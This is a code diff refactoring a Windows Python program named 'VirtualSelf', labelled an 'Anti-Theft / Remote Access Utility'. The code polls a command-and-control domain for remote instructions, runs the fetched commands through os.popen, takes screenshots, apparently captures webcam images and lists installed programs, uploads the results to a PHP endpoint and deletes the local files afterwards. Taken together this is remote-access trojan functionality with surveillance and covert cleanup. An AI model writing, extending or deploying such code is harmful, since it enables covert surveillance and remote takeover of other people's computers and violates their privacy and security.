@@ -17,7 +17,11 @@ from pystray import Icon, Menu, MenuItem
 from PIL import Image
 from plyer import notification
 
+# TODO: Instead of hard coding C:, find the Windows root dir + user dir dynamically.
+# TODO: Remove non-Windows specific code, such as for deriving computer name.
+
 PROGRAM_TITLE = "VirtualSelf"
+PROGRAM_DESCRIPTION = "Anti-Theft / Remote Access Utility"
 DEFAULT_SIGNAL1 = "remote1.html"
 DEFAULT_SIGNAL2 = "remote2.html"
 DEFAULT_SIGNAL3 = "remote3.html"
@@ -37,7 +41,7 @@ def Main():
     cncDomain = DEFAULT_CNC_DOMAIN.rstrip('/')
     postDomain = f"{cncDomain}/VirtualSelf.php"
 
-    Log("VirtualSelf: Anti-Theft Utility")
+    Log(f"{PROGRAM_TITLE}: {PROGRAM_DESCRIPTION}")
     Log("Running using the following configuration information:")
     Log(f"Signal One: {DEFAULT_SIGNAL1}")
     Log(f"Signal Two: {DEFAULT_SIGNAL2}")
@@ -70,8 +74,8 @@ def Main():
         time.sleep(DEFAULT_REFRESH_INTERVAL)
 
 def ProcessPrograms(postDomain):
-    installedPrograms = []
     filename = f"C:\\Users\\{SYSTEM_USER}\\installedprograms-{COMPUTER_NAME}-" + Get.ValidFilename(SYSTEM_USER, "txt")
+    installedPrograms = []
     registryPaths = [
         r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
         r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"
@@ -163,13 +167,17 @@ def ProcessWebcam(postDomain):
 
 def ProcessScreenshot(postDomain):
     try:
-        filename = TakeScreenshot()
+        filename = f"C:\\Users\\{SYSTEM_USER}\\screenshot-{COMPUTER_NAME}-" + Get.ValidFilename(SYSTEM_USER, "png")
+        screenshot = pyautogui.screenshot()
+        screenshot.save(filename)
+        Log(f"Took screenshot \"{filename}\".")
         UploadFile(filename, postDomain)
         CleanUp(filename)
     except Exception as e:
         Log(f"Error in screenshot process: {e}")
 
 def ProcessCommand(cncDomain, postDomain):
+    filename = f"C:\\Users\\{SYSTEM_USER}\\command-{COMPUTER_NAME}-" + Get.ValidFilename(SYSTEM_USER, "txt")
     try:
         command = GetSiteContent(f"{cncDomain}/{DEFAULT_SIGNAL2}") or "dir"
         shell = GetSiteContent(f"{cncDomain}/{DEFAULT_SIGNAL3}") or "cmd"
@@ -177,33 +185,13 @@ def ProcessCommand(cncDomain, postDomain):
         if shell not in ["cmd", "powershell", "wsl"]:
             shell = "cmd"
         
-        filename = RunCommand(command, shell)
+        commandOutput = os.popen(command).read().strip()
+        Log(f"Executed \"{command}\".")
+        WriteStringToFile(commandOutput, filename)
         UploadFile(filename, postDomain)
         CleanUp(filename)
     except Exception as e:
         Log(f"Error in command execution process: {e}")
-
-def TakeScreenshot():
-    filename = f"C:\\Users\\{SYSTEM_USER}\\screenshot-{COMPUTER_NAME}-" + Get.ValidFilename(SYSTEM_USER, "png")
-    try:
-        screenshot = pyautogui.screenshot()
-        screenshot.save(filename)
-        Log(f"Took screenshot \"{filename}\".")
-        return filename
-    except Exception as e:
-        Log(f"Error taking screenshot: {e}")
-        return None
-
-def RunCommand(command, shell):
-    filename = f"C:\\Users\\{SYSTEM_USER}\\command-{COMPUTER_NAME}-" + Get.ValidFilename(SYSTEM_USER, "txt")
-    try:
-        commandOutput = os.popen(command).read().strip()
-        Log(f"Executed \"{command}\".")
-        WriteStringToFile(commandOutput, filename)
-        return filename
-    except Exception as e:
-        Log(f"Error running command: {e}")
-        return None
 
 def GetSiteContent(URL):
     try:
@@ -239,8 +227,8 @@ def UploadFile(filename, postDomain):
 
 def CleanUp(filename):
     attempts = 0
-    max_attempts = 10
-    while attempts < max_attempts:
+    maxAttempts = 10
+    while attempts < maxAttempts:
         try:
             os.remove(filename)
             Log(f"Deleted file \"{filename}\".")
@@ -250,7 +238,7 @@ def CleanUp(filename):
             break
         except PermissionError:
             attempts += 1
-            Log(f"File is in use and cannot be deleted, attempt {attempts}/{max_attempts}: {filename}.")
+            Log(f"File is in use and cannot be deleted, attempt {attempts}/{maxAttempts}: {filename}.")
             time.sleep(1)
         except Exception as e:
             Log(f"Error cleaning up file: {e}")
